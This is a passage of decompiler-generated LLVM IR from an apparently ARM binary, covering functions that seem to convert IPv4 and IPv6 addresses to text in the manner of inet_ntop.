  %v2_13d50 = call i32 @function_c864(i32 %v1_13d4c, i32 10)
  %v1_13d54 = add i32 %v2_13d50, 48
  %v1_13d58 = trunc i32 %v1_13d54 to i8
  %v2_13d58 = load i32, i32* %sl.global-to-local, align 4
  %v3_13d58 = add i32 %v2_13d58, -17
  %v4_13d58 = inttoptr i32 %v3_13d58 to i8*
  store i8 %v1_13d58, i8* %v4_13d58, align 1
  %v0_13d5c = load i32, i32* %r7.global-to-local, align 4
  %v1_13d5c = add i32 %v0_13d5c, 1
  store i32 %v1_13d5c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13d60

dec_label_pc_13d60:                               ; preds = %bb, %dec_label_pc_13d14, %dec_label_pc_13d3c
  %v0_13d60 = load i32, i32* %sb.global-to-local, align 4
  %v1_13d60 = inttoptr i32 %v0_13d60 to i8*
  %v2_13d60 = load i8, i8* %v1_13d60, align 1
  %v3_13d60 = zext i8 %v2_13d60 to i32
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_13d68 = call i32 @function_c864(i32 %v3_13d60, i32 10)
  store i32 %v2_13d94, i32* %ip.global-to-local, align 4
  %v1_13d70 = load i32, i32* %r6.global-to-local, align 4
  %v1_13d74 = add i32 %v1_13d70, 1
  store i32 %v1_13d74, i32* %r1.global-to-local, align 4
  %v1_13d78 = add i32 %v2_13d68, 48
  %v1_13d7c = trunc i32 %v1_13d78 to i8
  %v3_13d7c = add i32 %v2_13d70, %v1_13d70
  %v4_13d7c = inttoptr i32 %v3_13d7c to i8*
  store i8 %v1_13d7c, i8* %v4_13d7c, align 1
  %v0_13d80 = load i32, i32* %ip.global-to-local, align 4
  %v1_13d80 = load i32, i32* %r1.global-to-local, align 4
  %v2_13d80 = add i32 %v1_13d80, %v0_13d80
  store i32 %v2_13d80, i32* %r2.global-to-local, align 4
  %v3_13d88 = add i32 %v2_13d80, -17
  %v4_13d88 = inttoptr i32 %v3_13d88 to i8*
  store i8 46, i8* %v4_13d88, align 1
  %v0_13d8c = load i32, i32* %r8.global-to-local, align 4
  %v1_13d8c = add i32 %v0_13d8c, 1
  store i32 %v1_13d8c, i32* %r8.global-to-local, align 4
  %v0_13d90 = load i32, i32* %r1.global-to-local, align 4
  %v1_13d90 = add i32 %v0_13d90, 1
  br label %dec_label_pc_13d94

dec_label_pc_13d94:                               ; preds = %dec_label_pc_13c9c, %dec_label_pc_13d60
  %v0_13ce0 = phi i32 [ 0, %dec_label_pc_13c9c ], [ %v1_13d90, %dec_label_pc_13d60 ]
  %v1_13cdc = phi i32 [ 0, %dec_label_pc_13c9c ], [ %v1_13d8c, %dec_label_pc_13d60 ]
  store i32 %v2_13d94, i32* %r2.global-to-local, align 4
  store i32 100, i32* @r1, align 4
  store i32 %v0_13ce0, i32* %r6.global-to-local, align 4
  %v2_13da4 = add i32 %v0_13ce0, %v2_13d94
  store i32 %v2_13da4, i32* %r5.global-to-local, align 4
  %v7_13da8 = icmp sgt i32 %v1_13cdc, 3
  br i1 %v7_13da8, label %dec_label_pc_13dac, label %dec_label_pc_13cdc

dec_label_pc_13dac:                               ; preds = %dec_label_pc_13d94
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_13cb8, i32* %r4.global-to-local, align 4
  %v3_13db4 = add i32 %v2_13da4, -18
  %v4_13db4 = inttoptr i32 %v3_13db4 to i8*
  store i8 0, i8* %v4_13db4, align 1
  store i32 %v2_13cb8, i32* @r0, align 4
  %v0_13dbc = call i32 @function_ecc0()
  %v2_13dc0 = load i32, i32* %stack_var_-64, align 4
  %tmp = icmp ugt i32 %v0_13dbc, %v2_13dc0
  br i1 %tmp, label %dec_label_pc_13dcc, label %dec_label_pc_13de0

dec_label_pc_13dcc:                               ; preds = %dec_label_pc_13dac
  %v0_13dcc = call i32 @function_cc08()
  %v0_13dd4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_13dd4, i32* %r2.global-to-local, align 4
  %v2_13dd8 = inttoptr i32 %v0_13dcc to i32*
  store i32 28, i32* %v2_13dd8, align 4
  %v0_13df0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13df0

dec_label_pc_13de0:                               ; preds = %dec_label_pc_13dac
  store i32 %v2_13cb8, i32* %r1.global-to-local, align 4
  %v2_13de8 = bitcast i32* %stack_var_-53 to i8*
  %v3_13de8 = call i32 @function_ed20(i32 %arg2, i8* %v2_13de8)
  store i32 %v3_13de8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13df0

dec_label_pc_13df0:                               ; preds = %dec_label_pc_13dcc, %dec_label_pc_13de0
  %v0_13df0 = phi i32 [ %v0_13df0.pre, %dec_label_pc_13dcc ], [ %v3_13de8, %dec_label_pc_13de0 ]
  %v2_13df8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_13df8, i32* @r4, align 4
  ret i32 %v0_13df0

; uselistorder directives
  uselistorder i32 %v1_13cdc, { 1, 0 }
  uselistorder i32 %v0_13ce0, { 0, 2, 1 }
  uselistorder i32 %v2_13d94, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 5, 4, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 (i32, i32)* @function_c864, { 10, 9, 8, 6, 5, 4, 3, 2, 1, 7, 0 }
  uselistorder i8 48, { 3, 4, 0, 1, 2, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 -17, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_13df0, { 1, 0 }
  uselistorder label %dec_label_pc_13d94, { 1, 0 }
  uselistorder label %dec_label_pc_13d60, { 2, 0, 1 }
}

define i32 @function_13e00(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13e00:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-110 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_13e00 = load i32, i32* @r4, align 4
  store i32 %v3_13e00, i32* %stack_var_-32, align 4
  %v6_13e00 = load i32, i32* @r5, align 4
  %v25_13e00 = ptrtoint i32* %stack_var_-32 to i32
  %v7_13e04 = icmp eq i32 %arg1, 2
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @sb, align 4
  store i32 %arg4, i32* @sl, align 4
  br i1 %v7_13e04, label %dec_label_pc_13e28, label %dec_label_pc_13e1c

dec_label_pc_13e1c:                               ; preds = %dec_label_pc_13e00
  %v7_13e1c = icmp eq i32 %arg1, 10
  br i1 %v7_13e1c, label %dec_label_pc_13e3c, label %dec_label_pc_1403c

dec_label_pc_13e28:                               ; preds = %dec_label_pc_13e00
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_13e34 = call i32 @function_13c9c(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_14034

dec_label_pc_13e3c:                               ; preds = %dec_label_pc_13e1c
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_13e48 = bitcast i32* %stack_var_-64 to i8*
  %v3_13e48 = call i32 @function_ec20(i8* %v2_13e48, i32 0)
  br label %dec_label_pc_13e68

dec_label_pc_13e54:                               ; preds = %dec_label_pc_13e68
  %tmp68 = icmp slt i32 %v1_13e58, 0
  %v4_13e68 = zext i1 %tmp68 to i32
  %v5_13e68 = add i32 %v4_13e68, %v1_13e58
  %v3_13e6c = sdiv i32 %v5_13e68, 2
  %v4_13e7c = mul i32 %v3_13e6c, 4
  %v5_13e7c = add i32 %v4_13e7c, %v25_13e00
  %v1_13e54 = add i32 %v2_13e78, 1
  %v2_13e54 = inttoptr i32 %v1_13e54 to i8*
  %v3_13e54 = load i8, i8* %v2_13e54, align 1
  %v4_13e54 = zext i8 %v3_13e54 to i32
  %v3_13e58 = inttoptr i32 %v2_13e78 to i8*
  %v4_13e58 = load i8, i8* %v3_13e58, align 1
  %v6_13e58 = zext i8 %v4_13e58 to i32
  store i32 %v6_13e58, i32* %r2.global-to-local, align 4
  %v4_13e5c = mul nuw nsw i32 %v6_13e58, 256
  %v5_13e5c = or i32 %v4_13e5c, %v4_13e54
  %v2_13e60 = add i32 %v5_13e7c, -32
  %v3_13e60 = inttoptr i32 %v2_13e60 to i32*
  store i32 %v5_13e5c, i32* %v3_13e60, align 4
  %v0_13e64 = load i32, i32* %r1.global-to-local, align 4
  %v1_13e64 = add i32 %v0_13e64, 2
  br label %dec_label_pc_13e68

dec_label_pc_13e68:                               ; preds = %dec_label_pc_13e3c, %dec_label_pc_13e54
  %v1_13e58 = phi i32 [ 0, %dec_label_pc_13e3c ], [ %v1_13e64, %dec_label_pc_13e54 ]
  store i32 %v1_13e58, i32* %r1.global-to-local, align 4
  %v0_13e78 = load i32, i32* @r8, align 4
  %v2_13e78 = add i32 %v0_13e78, %v1_13e58
  store i32 %v2_13e78, i32* %r2.global-to-local, align 4
  %v7_13e80 = icmp sgt i32 %v1_13e58, 15
  br i1 %v7_13e80, label %dec_label_pc_13e84, label %dec_label_pc_13e54

dec_label_pc_13e84:                               ; preds = %dec_label_pc_13e68
  store i32 -1, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13e94

dec_label_pc_13e94:                               ; preds = %dec_label_pc_13e84, %dec_label_pc_13ee0
  %v0_13ed4 = phi i32 [ -1, %dec_label_pc_13e84 ], [ %v0_13f08, %dec_label_pc_13ee0 ]
  %v0_13ec4 = phi i32 [ -1, %dec_label_pc_13e84 ], [ %v0_13ef4, %dec_label_pc_13ee0 ]
  %v0_13ea8 = phi i32 [ -1, %dec_label_pc_13e84 ], [ %v0_13ea88, %dec_label_pc_13ee0 ]
  %v0_13ee0 = phi i32 [ 0, %dec_label_pc_13e84 ], [ %v1_13ee0, %dec_label_pc_13ee0 ]
  %v4_13e98 = mul nuw nsw i32 %v0_13ee0, 4
  %v5_13e98 = add i32 %v4_13e98, %v25_13e00
  %v1_13e9c = add i32 %v5_13e98, -32
  %v2_13e9c = inttoptr i32 %v1_13e9c to i32*
  %v3_13e9c = load i32, i32* %v2_13e9c, align 4
  %v2_13ea0 = icmp eq i32 %v3_13e9c, 0
  %v7_13ea8 = icmp eq i32 %v0_13ea8, -1
  br i1 %v2_13ea0, label %dec_label_pc_13ea8, label %dec_label_pc_13ebc

dec_label_pc_13ea8:                               ; preds = %dec_label_pc_13e94
  br i1 %v7_13ea8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13ea8
  store i32 %v0_13ee0, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_13ee0

.thread:                                          ; preds = %dec_label_pc_13ea8
  %v1_13eb4.pre = load i32, i32* @r4, align 4
  %v2_13eb4 = add i32 %v1_13eb4.pre, 1
  store i32 %v2_13eb4, i32* @r4, align 4
  br label %dec_label_pc_13ee0

dec_label_pc_13ebc:                               ; preds = %dec_label_pc_13e94
  br i1 %v7_13ea8, label %dec_label_pc_13ee0, label %dec_label_pc_13ec4

dec_label_pc_13ec4:                               ; preds = %dec_label_pc_13ebc
  %v7_13ec4 = icmp eq i32 %v0_13ec4, -1
  %v0_13ed8.pre = load i32, i32* @r4, align 4
  %v1_13ecc = load i32, i32* @r7, align 4
  %v7_13ed0 = icmp sgt i32 %v0_13ed8.pre, %v1_13ecc
  %or.cond = or i1 %v7_13ec4, %v7_13ed0
  br i1 %or.cond, label %dec_label_pc_13ed4, label %dec_label_pc_13edc

dec_label_pc_13ed4:                               ; preds = %dec_label_pc_13ec4
  store i32 %v0_13ed4, i32* @r6, align 4
  store i32 %v0_13ed8.pre, i32* @r7, align 4
  br label %dec_label_pc_13edc

dec_label_pc_13edc:                               ; preds = %dec_label_pc_13ec4, %dec_label_pc_13ed4
  %v0_13ec413 = phi i32 [ %v0_13ed4, %dec_label_pc_13ed4 ], [ %v0_13ec4, %dec_label_pc_13ec4 ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13ee0

dec_label_pc_13ee0:                               ; preds = %bb, %.thread, %dec_label_pc_13ebc, %dec_label_pc_13edc
  %v0_13f08 = phi i32 [ %v0_13ed4, %.thread ], [ %v0_13ee0, %bb ], [ %v0_13ed4, %dec_label_pc_13ebc ], [ -1, %dec_label_pc_13edc ]
  %v0_13ea88 = phi i32 [ %v0_13ea8, %.thread ], [ %v0_13ee0, %bb ], [ -1, %dec_label_pc_13ebc ], [ -1, %dec_label_pc_13edc ]
  %v0_13ef4 = phi i32 [ %v0_13ec4, %.thread ], [ %v0_13ec4, %bb ], [ %v0_13ec4, %dec_label_pc_13ebc ], [ %v0_13ec413, %dec_label_pc_13edc ]
  %v1_13ee0 = add nuw nsw i32 %v0_13ee0, 1
  store i32 %v1_13ee0, i32* %r1.global-to-local, align 4
  %v7_13ee8 = icmp slt i32 %v1_13ee0, 8
  br i1 %v7_13ee8, label %dec_label_pc_13e94, label %dec_label_pc_13eec

dec_label_pc_13eec:                               ; preds = %dec_label_pc_13ee0
  %v7_13eec = icmp eq i32 %v0_13f08, -1
  br i1 %v7_13eec, label %dec_label_pc_13f0c, label %dec_label_pc_13ef4

dec_label_pc_13ef4:                               ; preds = %dec_label_pc_13eec
  %v7_13ef4 = icmp eq i32 %v0_13ef4, -1
  %v0_13f04.pre = load i32, i32* @r4, align 4
  br i1 %v7_13ef4, label %dec_label_pc_13f04, label %dec_label_pc_13efc

dec_label_pc_13efc:                               ; preds = %dec_label_pc_13ef4
  %v1_13efc = load i32, i32* @r7, align 4
  %v7_13f00 = icmp sgt i32 %v0_13f04.pre, %v1_13efc
  br i1 %v7_13f00, label %dec_label_pc_13f04, label %dec_label_pc_13f0c

dec_label_pc_13f04:                               ; preds = %dec_label_pc_13ef4, %dec_label_pc_13efc
  store i32 %v0_13f04.pre, i32* @r7, align 4
  store i32 %v0_13f08, i32* @r6, align 4
  br label %dec_label_pc_13f0c

dec_label_pc_13f0c:                               ; preds = %dec_label_pc_13efc, %dec_label_pc_13eec, %dec_label_pc_13f04
  %v0_13f0c = phi i32 [ %v0_13ef4, %dec_label_pc_13efc ], [ %v0_13ef4, %dec_label_pc_13eec ], [ %v0_13f08, %dec_label_pc_13f04 ]
  %v7_13f0c = icmp eq i32 %v0_13f0c, -1
  br i1 %v7_13f0c, label %bb49, label %dec_label_pc_13f14

dec_label_pc_13f14:                               ; preds = %dec_label_pc_13f0c
  %v0_13f14 = load i32, i32* @r7, align 4
  %v7_13f18 = icmp slt i32 %v0_13f14, 2
  br i1 %v7_13f18, label %bb48, label %bb49

bb48:                                             ; preds = %dec_label_pc_13f14
  store i32 -1, i32* @r6, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_13f0c, %dec_label_pc_13f14, %bb48
  %v0_13f2823 = phi i32 [ %v0_13f0c, %dec_label_pc_13f0c ], [ %v0_13f0c, %dec_label_pc_13f14 ], [ -1, %bb48 ]
  %v2_13f1c = ptrtoint i32* %stack_var_-110 to i32
  store i32 %v2_13f1c, i32* @r4, align 4
  %v9_13f88 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @r5, align 4
  %v7_13f2863 = icmp eq i32 %v0_13f2823, -1
  br label %dec_label_pc_13f28

dec_label_pc_13f28:                               ; preds = %bb49, %dec_label_pc_13fdc
  %v7_13f2867 = phi i1 [ %v7_13f2863, %bb49 ], [ %v7_13f28, %dec_label_pc_13fdc ]
  %v0_13f5466 = phi i32 [ 0, %bb49 ], [ %v1_13fdc, %dec_label_pc_13fdc ]
  %v1_13f4465 = phi i32 [ %v0_13f2823, %bb49 ], [ %v0_13f28.pre, %dec_label_pc_13fdc ]
  %v3_13f5c64 = phi i32 [ %v2_13f1c, %bb49 ], [ %v3_13f4c24, %dec_label_pc_13fdc ]
  br i1 %v7_13f2867, label %dec_label_pc_13f54, label %dec_label_pc_13f30

dec_label_pc_13f30:                               ; preds = %dec_label_pc_13f28
  %v9_13f30 = icmp eq i32 %v0_13f5466, %v1_13f4465
  %v5_13f34 = icmp slt i32 %v0_13f5466, %v1_13f4465
  br i1 %v5_13f34, label %dec_label_pc_13f54, label %dec_label_pc_13f38

dec_label_pc_13f38:                               ; preds = %dec_label_pc_13f30
  %v1_13f38 = load i32, i32* @r7, align 4
  %v2_13f38 = add i32 %v1_13f38, %v1_13f4465
  %v6_13f40 = icmp slt i32 %v0_13f5466, %v2_13f38
  br i1 %v6_13f40, label %dec_label_pc_13f44, label %dec_label_pc_13f54

dec_label_pc_13f44:                               ; preds = %dec_label_pc_13f38
  br i1 %v9_13f30, label %bb51, label %dec_label_pc_13fdc

bb51:                                             ; preds = %dec_label_pc_13f44
  %v4_13f4c = inttoptr i32 %v3_13f5c64 to i8*
  store i8 58, i8* %v4_13f4c, align 1
  %v5_13f4c = load i32, i32* @r4, align 4
  %v6_13f4c = add i32 %v5_13f4c, 1
  store i32 %v6_13f4c, i32* @r4, align 4
  br label %dec_label_pc_13fdc

dec_label_pc_13f54:                               ; preds = %dec_label_pc_13f38, %dec_label_pc_13f30, %dec_label_pc_13f28
  %v2_13f54 = icmp eq i32 %v0_13f5466, 0
  br i1 %v2_13f54, label %.thread3, label %bb52

bb52:                                             ; preds = %dec_label_pc_13f54
  %v4_13f5c = inttoptr i32 %v3_13f5c64 to i8*
  store i8 58, i8* %v4_13f5c, align 1
  %v5_13f5c = load i32, i32* @r4, align 4
  %v6_13f5c = add i32 %v5_13f5c, 1
  store i32 %v6_13f5c, i32* @r4, align 4
  %v0_13f60.pre = load i32, i32* @r5, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_13f54, %bb52
  %v0_13fa0 = phi i32 [ %v3_13f5c64, %dec_label_pc_13f54 ], [ %v6_13f5c, %bb52 ]
  %v1_13fc4 = phi i32 [ 0, %dec_label_pc_13f54 ], [ %v0_13f60.pre, %bb52 ]
  %v7_13f60 = icmp eq i32 %v1_13fc4, 6
  br i1 %v7_13f60, label %dec_label_pc_13f68, label %dec_label_pc_13fc0

dec_label_pc_13f68:                               ; preds = %.thread3
  %v0_13f68 = load i32, i32* @r6, align 4
  %v2_13f68 = icmp eq i32 %v0_13f68, 0
  br i1 %v2_13f68, label %dec_label_pc_13f70, label %dec_label_pc_13fc0

dec_label_pc_13f70:                               ; preds = %dec_label_pc_13f68
  %v0_13f70 = load i32, i32* @r7, align 4
  %v7_13f70 = icmp eq i32 %v0_13f70, 6
  br i1 %v7_13f70, label %dec_label_pc_13f90, label %dec_label_pc_13f78

dec_label_pc_13f78:                               ; preds = %dec_label_pc_13f70
  %v7_13f78 = icmp eq i32 %v0_13f70, 5
  br i1 %v7_13f78, label %dec_label_pc_13f80, label %dec_label_pc_13fc0

dec_label_pc_13f80:                               ; preds = %dec_label_pc_13f78
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br i1 %v9_13f88, label %dec_label_pc_13f90, label %dec_label_pc_13fc0

dec_label_pc_13f90:                               ; preds = %dec_label_pc_13f80, %dec_label_pc_13f70
  %v2_13f94 = sub i32 %v25_13e00, %v0_13fa0
  %v0_13f98 = load i32, i32* @r8, align 4
  %v1_13f98 = add i32 %v0_13f98, 12
  %v1_13f9c = add i32 %v2_13f94, -32
  store i32 %v1_13f9c, i32* %r2.global-to-local, align 4
  store i32 %v0_13fa0, i32* %r1.global-to-local, align 4
  %v3_13fa4 = call i32 @function_13c9c(i32 %v1_13f98, i32 %v0_13fa0, i32 %v1_13f9c)
  %v2_13fa8 = icmp eq i32 %v3_13fa4, 0
  br i1 %v2_13fa8, label %dec_label_pc_14034, label %dec_label_pc_13fb0

dec_label_pc_13fb0:                               ; preds = %dec_label_pc_13f90
  %v0_13fb0 = load i32, i32* @r4, align 4
  store i32 %v0_13fb0, i32* @r0, align 4
  %v0_13fb4 = call i32 @function_ecc0()
  %v0_13fb8 = load i32, i32* @r4, align 4
  %v2_13fb8 = add i32 %v0_13fb8, %v0_13fb4
  store i32 %v2_13fb8, i32* @r4, align 4
  %v0_13ff0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13ff0

dec_label_pc_13fc0:                               ; preds = %dec_label_pc_13f80, %dec_label_pc_13f78, %dec_label_pc_13f68, %.thread3
  %v4_13fc4 = mul i32 %v1_13fc4, 4
  %v5_13fc4 = add i32 %v4_13fc4, %v25_13e00
  store i32 %v0_13fa0, i32* @r0, align 4
  %v1_13fcc = add i32 %v5_13fc4, -32
  %v2_13fcc = inttoptr i32 %v1_13fcc to i32*
  %v3_13fcc = load i32, i32* %v2_13fcc, align 4
  store i32 %v3_13fcc, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_17c88.607 to i32), i32* %r1.global-to-local, align 4
  %v4_13fd4 = call i32 @function_cdb0(i32 %v0_13fa0, i32 ptrtoint ([3 x i8]* @global_var_17c88.607 to i32), i32 %v3_13fcc)
  %v0_13fd8 = load i32, i32* @r4, align 4
  %v2_13fd8 = add i32 %v0_13fd8, %v4_13fd4
  store i32 %v2_13fd8, i32* @r4, align 4
  br label %dec_label_pc_13fdc

dec_label_pc_13fdc:                               ; preds = %dec_label_pc_13f44, %bb51, %dec_label_pc_13fc0
  %v3_13f4c24 = phi i32 [ %v3_13f5c64, %dec_label_pc_13f44 ], [ %v6_13f4c, %bb51 ], [ %v2_13fd8, %dec_label_pc_13fc0 ]
  %v0_13fdc = load i32, i32* @r5, align 4
  %v1_13fdc = add i32 %v0_13fdc, 1
  %v0_13f28.pre = load i32, i32* @r6, align 4
  store i32 %v1_13fdc, i32* @r5, align 4
  %v7_13fe4 = icmp slt i32 %v1_13fdc, 8
  %v7_13f28 = icmp eq i32 %v0_13f28.pre, -1
  br i1 %v7_13fe4, label %dec_label_pc_13f28, label %dec_label_pc_13fe8

dec_label_pc_13fe8:                               ; preds = %dec_label_pc_13fdc
  br i1 %v7_13f28, label %.thread4, label %dec_label_pc_13ff0

dec_label_pc_13ff0:                               ; preds = %dec_label_pc_13fe8, %dec_label_pc_13fb0
  %v3_13ffc = phi i32 [ %v3_13f4c24, %dec_label_pc_13fe8 ], [ %v2_13fb8, %dec_label_pc_13fb0 ]
  %v0_13ff0 = phi i32 [ %v0_13f28.pre, %dec_label_pc_13fe8 ], [ %v0_13ff0.pre, %dec_label_pc_13fb0 ]
  %v1_13ff0 = load i32, i32* @r7, align 4
  %v2_13ff0 = add i32 %v1_13ff0, %v0_13ff0
  %v7_13ff4 = icmp eq i32 %v2_13ff0, 8
  br i1 %v7_13ff4, label %bb53, label %.thread4

bb53:                                             ; preds = %dec_label_pc_13ff0
  %v4_13ffc = inttoptr i32 %v3_13ffc to i8*
  store i8 58, i8* %v4_13ffc, align 1
  %v5_13ffc = load i32, i32* @r4, align 4
  %v6_13ffc = add i32 %v5_13ffc, 1
  store i32 %v6_13ffc, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13ff0, %dec_label_pc_13fe8, %bb53
  %v2_14004 = phi i32 [ %v3_13ffc, %dec_label_pc_13ff0 ], [ %v3_13f4c24, %dec_label_pc_13fe8 ], [ %v6_13ffc, %bb53 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_14004 = inttoptr i32 %v2_14004 to i8*
  store i8 0, i8* %v3_14004, align 1
  %v4_14004 = load i32, i32* @r4, align 4
  %v5_14004 = add i32 %v4_14004, 1
  store i32 %v2_13f1c, i32* %r1.global-to-local, align 4
  %v2_1400c = sub i32 %v5_14004, %v2_13f1c
  %v1_14010 = load i32, i32* @sl, align 4
  %tmp69 = icmp ugt i32 %v2_1400c, %v1_14010
  br i1 %tmp69, label %dec_label_pc_14018, label %dec_label_pc_1402c

dec_label_pc_14018:                               ; preds = %.thread4
  %v0_14018 = call i32 @function_cc08()
  %v0_14020 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14020, i32* %r2.global-to-local, align 4
  %v2_14024 = inttoptr i32 %v0_14018 to i32*
  store i32 28, i32* %v2_14024, align 4
  %v0_1404c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1404c

dec_label_pc_1402c:                               ; preds = %.thread4
  %v0_1402c = load i32, i32* @sb, align 4
  %v2_14030 = bitcast i32* %stack_var_-110 to i8*
  %v3_14030 = call i32 @function_ed20(i32 %v0_1402c, i8* %v2_14030)
  br label %dec_label_pc_14034

dec_label_pc_14034:                               ; preds = %dec_label_pc_13f90, %dec_label_pc_13e28, %dec_label_pc_1402c
  %v0_14034 = phi i32 [ 0, %dec_label_pc_13f90 ], [ %v3_13e34, %dec_label_pc_13e28 ], [ %v3_14030, %dec_label_pc_1402c ]
  store i32 %v0_14034, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1404c

dec_label_pc_1403c:                               ; preds = %dec_label_pc_13e1c
  %v0_1403c = call i32 @function_cc08()
  %v2_14044 = inttoptr i32 %v0_1403c to i32*
  store i32 97, i32* %v2_14044, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1404c

dec_label_pc_1404c:                               ; preds = %dec_label_pc_14034, %dec_label_pc_14018, %dec_label_pc_1403c
  %v0_1404c = phi i32 [ %v0_14034, %dec_label_pc_14034 ], [ %v0_1404c.pre, %dec_label_pc_14018 ], [ 0, %dec_label_pc_1403c ]
  store i32 %v6_13e00, i32* %r5.global-to-local, align 4
  ret i32 %v0_1404c

; uselistorder directives
  uselistorder i1 %v7_13f28, { 1, 0 }
  uselistorder i32 %v0_13f28.pre, { 1, 0, 2 }
  uselistorder i32 %v1_13fdc, { 1, 0, 2 }
  uselistorder i32 %v0_13fa0, { 4, 3, 1, 0, 2 }
  uselistorder i32 %v3_13f5c64, { 0, 3, 2, 1 }
  uselistorder i32 %v1_13f4465, { 2, 0, 1 }
  uselistorder i32 %v0_13f5466, { 3, 2, 0, 1 }
  uselistorder i32 %v2_13f1c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_13f2823, { 1, 0 }
  uselistorder i32 %v0_13f0c, { 1, 2, 0 }
  uselistorder i32 %v1_13ee0, { 1, 2, 0 }
  uselistorder i32 %v0_13ef4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_13f08, { 1, 2, 0, 3 }
  uselistorder i1 %v7_13ea8, { 1, 0 }
  uselistorder i32 %v0_13ee0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_13ec4, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_13ed4, { 3, 1, 0, 2 }
  uselistorder i32 %v2_13e78, { 2, 1, 0 }
  uselistorder i32 %v1_13e58, { 3, 1, 4, 0, 2 }
  uselistorder i32 %v25_13e00, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 8, 6, 7, 0 }
  uselistorder i32 97, { 2, 3, 5, 0, 1, 6, 4 }
  uselistorder i32 (i32, i8*)* @function_ed20, { 0, 1, 4, 5, 6, 7, 2, 3, 8, 9 }
  uselistorder i32 (i8*, i32)* @function_ec20, { 0, 1, 10, 6, 7, 8, 15, 13, 14, 9, 2, 3, 4, 5, 11, 12 }
  uselistorder i32 (i32, i32, i32)* @function_13c9c, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1404c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14034, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13fdc, { 2, 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_13f28, { 1, 0 }
  uselistorder label %bb49, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13f0c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13f04, { 1, 0 }
  uselistorder label %dec_label_pc_13ee0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_13edc, { 1, 0 }
  uselistorder label %dec_label_pc_13e94, { 1, 0 }
  uselistorder label %dec_label_pc_13e68, { 1, 0 }
}

define i32 @function_14060(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_14060:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_14064 = load i32, i32* @r4, align 4
  store i32 %v3_14064, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v7_14074 = icmp sgt i32 %arg3, 11
  br i1 %v7_14074, label %dec_label_pc_14078, label %dec_label_pc_14140

dec_label_pc_14078:                               ; preds = %dec_label_pc_14060
  %tmp18 = inttoptr i32 %arg2 to i8*
  %v1_14078 = add i32 %tmp, 1
  %v2_14078 = inttoptr i32 %v1_14078 to i8*
  %v3_14078 = load i8, i8* %v2_14078, align 1
  store i8 %v3_14078, i8* %tmp18, align 1
